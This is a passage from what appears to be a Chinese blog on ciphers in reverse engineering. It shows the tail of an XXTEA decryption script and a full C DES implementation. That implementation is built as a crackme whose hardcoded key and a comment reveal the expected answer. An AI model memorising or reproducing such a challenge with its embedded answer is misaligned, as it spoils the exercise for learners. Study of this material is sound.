该算法中每次可加密不只64bit的数据，并且加密的轮数由加密数据长度决定</span></span><br><span class="line">    v = [<span class="number">1374278842</span>, <span class="number">2136006540</span>, <span class="number">4191056815</span>, <span class="number">3248881376</span>]</span><br><span class="line">    k = [<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>]</span><br><span class="line">    n = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    res = decrypt(n, v, k)</span><br><span class="line">    <span class="comment"># print(&quot;Data is : &quot;, hex(v[0]), hex(v[1]))</span></span><br><span class="line">    <span class="comment"># res = encrypt(n, v, k)</span></span><br><span class="line">    <span class="comment"># print(&quot;Encrypted data is : &quot;, hex(res[0]), hex(res[1]))</span></span><br><span class="line">    <span class="comment"># res = decrypt(n, res, k)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted data is : &quot;</span>, <span class="built_in">hex</span>(res[<span class="number">0</span>]), <span class="built_in">hex</span>(res[<span class="number">1</span>]), <span class="built_in">hex</span>(res[<span class="number">2</span>]), <span class="built_in">hex</span>(res[<span class="number">3</span>]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Data is :  0x12345678 0x78563412</span></span><br><span class="line"><span class="string">Encrypted data is :  0xef86c2bb 0x25f31b5e</span></span><br><span class="line"><span class="string">Decrypted data is :  0x12345678 0x78563412</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="其他"><a class="markdownIt-Anchor" href="#其他">#</a> 其他</h3>
<h4 id="des"><a class="markdownIt-Anchor" href="#des">#</a> DES</h4>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encryption</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * plaintext,<span class="type">unsigned</span> <span class="type">char</span> * ciphertext)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decryption</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * ciphertext,<span class="type">unsigned</span> <span class="type">char</span> * plaintext)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ip_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> *out)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fp_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> *out)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">byte2Bit</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span> *out,<span class="type">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bit2Byte</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span> *out,<span class="type">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span> * out,<span class="type">unsigned</span> <span class="type">char</span> *ki)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_subkey</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">byteXOR</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a,<span class="type">unsigned</span> <span class="type">char</span> *b,<span class="type">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">e_expand</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> * out)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">s_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> * out)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">p_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> * out)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pc1_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> * out)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pc2_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span> *out)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> IP_Table[<span class="number">64</span>]= &#123;</span><br><span class="line">        <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">        <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> IPR_Table[<span class="number">64</span>] = &#123;</span><br><span class="line">        <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">        <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> E_Table[<span class="number">48</span>] = &#123;</span><br><span class="line">        <span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">        <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">        <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> P_Table[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>,  <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>,  <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">        <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>,  <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>,  <span class="number">25</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> PC1_Table[<span class="number">56</span>] = &#123;</span><br><span class="line">        <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">        <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,  <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">        <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> PC2_Table[<span class="number">48</span>] = &#123;</span><br><span class="line">        <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">        <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">26</span>,  <span class="number">8</span>, <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line">        <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">        <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> LOOP_Table[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> S_Box[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="comment">// S1</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">        <span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="comment">// S2</span></span><br><span class="line">        <span class="number">15</span>, <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">        <span class="comment">// S3</span></span><br><span class="line">        <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>,</span><br><span class="line">        <span class="comment">// S4</span></span><br><span class="line">        <span class="number">7</span>,  <span class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">        <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>,</span><br><span class="line">        <span class="comment">// S5</span></span><br><span class="line">        <span class="number">2</span>,  <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">        <span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">        <span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>,</span><br><span class="line">        <span class="comment">// S6</span></span><br><span class="line">        <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="comment">// S7</span></span><br><span class="line">        <span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>,</span><br><span class="line">        <span class="comment">// S8</span></span><br><span class="line">        <span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>,</span><br><span class="line">        <span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> subkey[<span class="number">16</span>][<span class="number">48</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> result[]=&#123;<span class="number">0xef</span>,<span class="number">0x34</span>,<span class="number">0xd4</span>,<span class="number">0xa3</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,<span class="number">0xe4</span>,<span class="number">0x23</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">9</span>] = <span class="string">&quot;DE3_En1C&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> plaintext[<span class="number">20</span>];</span><br><span class="line">  <span class="comment">//HarDd3s?</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ciphertext[<span class="number">8</span>];</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me a string to encrypt:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,plaintext);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)plaintext)!=<span class="number">8</span>)&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//to generate 16 round subkey</span></span><br><span class="line">    <span class="built_in">get_subkey</span>(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//to encrypt plaintext</span></span><br><span class="line">    <span class="built_in">encryption</span>(plaintext,ciphertext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ciphertext[i]!=result[i])&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!!&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;G00d Job!!&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 